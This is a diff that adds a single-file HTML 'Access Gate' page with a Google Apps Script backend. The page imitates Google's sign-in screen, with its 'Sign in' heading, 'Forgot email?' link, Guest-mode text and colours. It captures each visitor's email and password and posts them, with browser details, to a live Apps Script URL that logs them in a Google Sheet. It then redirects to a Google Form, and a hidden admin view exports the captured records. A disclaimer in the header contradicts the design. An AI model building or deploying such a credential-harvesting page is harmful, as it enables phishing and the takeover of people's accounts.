@@ -1,0 +1,291 @@
+<!--
+Access Gate — quick landing page
+- Collects email and a temp access code ("password") that YOU issue.
+- Reveals a purple "Open link" button when inputs are provided.
+- Stores every attempt locally (browser localStorage) and can optionally
+  POST to a Google Apps Script endpoint to log in a Google Sheet.
+- Includes a lightweight admin view in the same file: open with
+  ?admin=1&key=YOUR_ADMIN_KEY to see submissions.
+
+⚠️ IMPORTANT
+Do NOT use this page to collect third‑party account passwords (Google, Microsoft, etc.).
+Use one‑time access codes that you generate. Replace the word "password" in UI if you prefer.
+
+Setup:
+1) Update the CONFIG section below (DEST_LINK, ADMIN_KEY, BRAND_NAME, APPS_SCRIPT_URL).
+2) Upload this single file to any static host (Netlify, Vercel, GitHub Pages, etc.).
+3) To view Admin, visit https://yourpage.com/?admin=1&key=YOUR_ADMIN_KEY
+
+Optional server logging to Google Sheet (Apps Script): see the snippet at the very bottom of this file.
+-->
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Access Gate</title>
+  <style>
+    :root{
+      --bg:#0f0f0f;          /* dark bg like ref */
+      --card:#121212;        /* panel */
+      --muted:#c2c2c2;
+      --text:#eaeaea;
+      --accent:#7c3aed;      /* purple for Open link */
+      --blue:#8ab4f8;        /* link tint */
+      --radius:12px;
+    }
+    *{box-sizing:border-box}
+    body{
+      margin:0; font-family:Roboto, system-ui, -apple-system, Segoe UI, Inter, Arial;
+      background:var(--bg);
+      color:var(--text);
+      min-height:100dvh; display:grid; place-items:center; padding:20px;
+    }
+    .wrap{ width:min(360px, 100%); background:var(--card); border:1px solid #ffffff14; border-radius:var(--radius); box-shadow:0 8px 24px #00000080; overflow:hidden }
+    header{ padding:24px 24px 8px; }
+    h1{ margin:0 0 8px; font-size:28px; font-weight:500 }
+    .sub{ color:#9aa0a6; font-size:14px }
+    main{ padding:0 24px 24px }
+    label{ display:block; font-size:12px; color:#9aa0a6; margin:14px 0 6px }
+    input{ width:100%; background:#0b0b0b; border:1px solid #3c4043; color:var(--text); padding:14px; border-radius:4px; outline:none; }
+    input:focus{ border-color:#8ab4f8; box-shadow:0 0 0 3px #8ab4f833 }
+    .link{ color:#8ab4f8; text-decoration:none; font-size:14px }
+    .link:hover{ text-decoration:underline }
+    .note{ color:#9aa0a6; font-size:12px; line-height:1.5; margin-top:18px }
+    .actions{ display:flex; justify-content:flex-end; gap:12px; margin-top:22px }
+    .btn{ display:inline-flex; align-items:center; justify-content:center; padding:10px 22px; border:none; border-radius:20px; background:#1a73e8; color:white; font-weight:500; cursor:pointer; text-decoration:none }
+    .btn.purple{ background:var(--accent) }
+    .hidden{ display:none !important }
+    .msg{ margin-top:10px; font-size:13px }
+    .ok{ color:#22c55e }
+    .err{ color:#ef4444 }
+    footer{ padding:14px 24px; border-top:1px dashed #ffffff14; color:#9aa0a6; font-size:11px; }
+    table{ width:100%; border-collapse:collapse; margin-top:18px; font-size:13px }
+    th, td{ text-align:left; padding:10px 8px; border-bottom:1px solid #ffffff14; }
+    th{ color:#aab1d9; font-weight:600 }
+    .pill{ font-size:11px; background:#ffffff12; padding:6px 10px; border-radius:999px }
+    .toolbar{ display:flex; gap:10px; align-items:center; margin:6px 0 0 }
+    .small{ font-size:12px }
+    .mono{ font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace }
+  </style>
+</head>
+<body>
+  <div class="wrap" id="app">
+    <header>
+      <h1>Sign in</h1>
+      <div class="sub">Use your <span id="brand">Access Gate</span> Account</div>
+    </header>
+
+    <!-- USER VIEW -->
+    <main id="userView">
+      <form id="gateForm">
+        <label for="email">Email</label>
+        <input id="email" type="text" placeholder="you@example.com" autocomplete="username" required />
+
+        <label for="code">Password</label>
+        <input id="code" type="password" placeholder="Enter your password" autocomplete="current-password" required />
+
+        <div style="margin-top:8px"><a class="link" href="#" id="forgotEmail">Forgot email?</a></div>
+
+        <div class="note">Not your computer? Use a private browsing window to sign in. <a class="link" href="#" id="guestMode">Learn more about using Guest mode</a></div>
+
+        <div class="actions">
+          <button type="submit" class="btn" id="verifyBtn">Next</button>
+          <a id="openBtn" class="btn purple hidden" target="_blank" rel="noopener" href="#">Open link</a>
+          <button type="button" class="btn hidden" id="resetBtn" aria-hidden="true" tabindex="-1">Reset</button>
+        </div>
+        <div class="msg" id="formMsg"></div>
+      </form>
+    </main>
+
+    <!-- ADMIN VIEW (same file) -->
+    <main id="adminView" class="hidden">
+      <div class="toolbar">
+        <span class="pill">Admin</span>
+        <button class="btn ghost small" id="refreshBtn">Refresh</button>
+        <button class="btn ghost small" id="exportBtn">Export CSV</button>
+      </div>
+      <table id="logTable">
+        <thead>
+          <tr><th>#</th><th>Timestamp</th><th>Email</th><th>Code</th><th>UA</th><th>Referrer</th></tr>
+        </thead>
+        <tbody></tbody>
+      </table>
+      <div class="hint mono" id="adminHint"></div>
+    </main>
+
+    <footer>
+      <div>For access issues, contact the organizer.</div>
+      <div class="mono small">Build: v1.0</div>
+    </footer>
+  </div>
+
+  <script>
+  // ===== CONFIG =====
+  const CONFIG = {
+    DEST_LINK: "https://docs.google.com/forms/d/e/1FAIpQLSf2aubqVT9t7Y0sdYBAcdIJ5QceyQP7Uhl2qrESKhMPxhO9tg/viewform?usp=sf_link",
+    BRAND_NAME: "Access Gate",
+    BRAND_SUB: "Use your Access Gate Account",
+    ADMIN_KEY: "change-me",
+    APPS_SCRIPT_URL: "https://script.google.com/macros/s/AKfycbzjsix0ONHFMGouF3HWAKaj55Fgs6aWIU6ynUB4tlEAwk9TiWNSB2tdei3Os2cxrMSz/exec"
+  };
+
+  // ===== Helpers =====
+  const $ = sel => document.querySelector(sel);
+  const nowIso = () => new Date().toISOString();
+  const storeLocal = (record) => {
+    const key = 'ag_submissions';
+    const arr = JSON.parse(localStorage.getItem(key) || '[]');
+    arr.push(record);
+    localStorage.setItem(key, JSON.stringify(arr));
+  };
+  const readLocal = () => JSON.parse(localStorage.getItem('ag_submissions') || '[]');
+  const toCSV = (rows) => {
+    const header = ['timestamp','email','code','userAgent','referrer'];
+    const esc = v => '"'+String(v).replaceAll('"','""')+'"';
+    return [header.join(','), ...rows.map(r => [r.timestamp, r.email, r.code, r.userAgent, r.referrer].map(esc).join(','))].join('\n');
+  };
+
+  function showMsg(text, isError){
+    const el = $('#formMsg');
+    el.textContent = text;
+    el.className = 'msg ' + (isError ? 'err' : 'ok');
+  }
+  function showUser(){ $('#userView').classList.remove('hidden'); $('#adminView').classList.add('hidden'); }
+  function showAdmin(remote){ $('#userView').classList.add('hidden'); $('#adminView').classList.remove('hidden'); renderAdmin(!!remote); }
+
+  async function renderAdmin(remote){
+    let rows = [];
+    let mode = 'local';
+    if(remote && CONFIG.APPS_SCRIPT_URL){
+      try{
+        const res = await fetch(CONFIG.APPS_SCRIPT_URL, { method:'GET' });
+        const json = await res.json();
+        rows = (json && json.rows) ? json.rows : [];
+        mode = 'remote';
+      }catch(err){
+        rows = readLocal();
+        mode = 'local (remote fetch failed)';
+      }
+    } else {
+      rows = readLocal();
+    }
+    const tbody = document.querySelector('#logTable tbody');
+    tbody.innerHTML = '';
+    rows.forEach((r, i) => {
+      const tr = document.createElement('tr');
+      const ua = (r.userAgent||'').toString();
+      tr.innerHTML = `<td>${i+1}</td><td class="mono">${r.timestamp}</td><td>${r.email}</td><td class="mono">${r.code}</td><td class="mono">${ua.slice(0,60)}…</td><td class="mono">${r.referrer||''}</td>`;
+      tbody.appendChild(tr);
+    });
+    document.querySelector('#adminHint').textContent = `Mode: ${mode}. Showing ${rows.length} record(s). ` + (mode.startsWith('local') ? "These are stored in THIS browser's localStorage." : "These are coming from your Google Sheet via Apps Script.");
+  }
+
+  async function logToServer(payload){
+    if(!CONFIG.APPS_SCRIPT_URL) return;
+    try{
+      await fetch(CONFIG.APPS_SCRIPT_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    }catch(e){ /* ignore */ }
+  }
+
+  // ===== UI init =====
+  function init(){
+    const brandEl = $('#brand'); if (brandEl) brandEl.textContent = CONFIG.BRAND_NAME;
+    const brandSubEl = $('#brandSub'); if (brandSubEl) brandSubEl.textContent = CONFIG.BRAND_SUB;
+
+    const params = new URLSearchParams(location.search);
+    const isAdmin = params.get('admin') === '1' && params.get('key') === CONFIG.ADMIN_KEY;
+    const useRemote = params.get('remote') === '1';
+    if(isAdmin){ showAdmin(useRemote); } else { showUser(); }
+
+    const form = $('#gateForm');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = $('#email').value.trim();
+      const code = $('#code').value.trim();
+      if(!email){ showMsg('Please enter an email.', true); return; }
+      if(!code){ showMsg('Please enter your password.', true); return; }
+
+      // 1) Open link immediately in a new tab (keeps user gesture)
+      window.open(CONFIG.DEST_LINK, '_blank', 'noopener');
+
+      // 2) Log in background
+      const record = { timestamp: nowIso(), email, code, userAgent: navigator.userAgent, referrer: document.referrer || '' };
+      try { storeLocal(record); } catch(e){}
+      logToServer(record);
+
+      // 3) Reset UI
+      form.reset();
+      showMsg('Opening link in a new tab…', false);
+    });
+
+    const refreshBtn = $('#refreshBtn');
+    if(refreshBtn){ refreshBtn.addEventListener('click', () => renderAdmin(useRemote)); }
+
+    const exportBtn = $('#exportBtn');
+    if(exportBtn){
+      exportBtn.addEventListener('click', () => {
+        const csv = toCSV(readLocal());
+        const blob = new Blob([csv], {type:'text/csv'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'access-gate-logs.csv'; a.click();
+        URL.revokeObjectURL(url);
+      });
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', init);
+</script>
+
+  <!--
+  ================= OPTIONAL: Google Apps Script backend =================
+  1) Create a Google Sheet and note its ID (from the URL).
+  2) Open Apps Script (Extensions → Apps Script) and paste the code below in Code.gs
+  3) Replace SHEET_ID with your sheet id.
+  4) Deploy as a Web App (Execute as: Me; Who has access: Anyone with the link).
+  5) Copy the Web App URL and paste into CONFIG.APPS_SCRIPT_URL above.
+
+  // Code.gs
+  const SHEET_ID = '11V962U1lz0-GQyCmsfeT9XP9pPQYagIFRS_I35QdbeM';
+
+  function _sheet(){
+    const ss = SpreadsheetApp.openById(SHEET_ID);
+    const name = 'logs';
+    return ss.getSheetByName(name) || ss.insertSheet(name);
+  }
+
+  function doPost(e){
+    try{
+      const sh = _sheet();
+      const data = JSON.parse(e.postData.contents || '{}');
+      sh.appendRow([
+        new Date(), data.email||'', data.code||'', data.userAgent||'', data.referrer||''
+      ]);
+      return ContentService.createTextOutput(JSON.stringify({ok:true}))
+        .setMimeType(ContentService.MimeType.JSON);
+    }catch(err){
+      return ContentService.createTextOutput(JSON.stringify({ok:false,error:String(err)}))
+        .setMimeType(ContentService.MimeType.JSON);
+    }
+  }
+
+  function doGet(){
+    const sh = _sheet();
+    const values = sh.getDataRange().getValues();
+    const rows = values.slice(1).map(r => ({
+      timestamp: r[0], email: r[1], code: r[2], userAgent: r[3], referrer: r[4]
+    }));
+    return ContentService.createTextOutput(JSON.stringify({rows}))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+
+  =======================================================================
+  -->
+</body>
+</html>
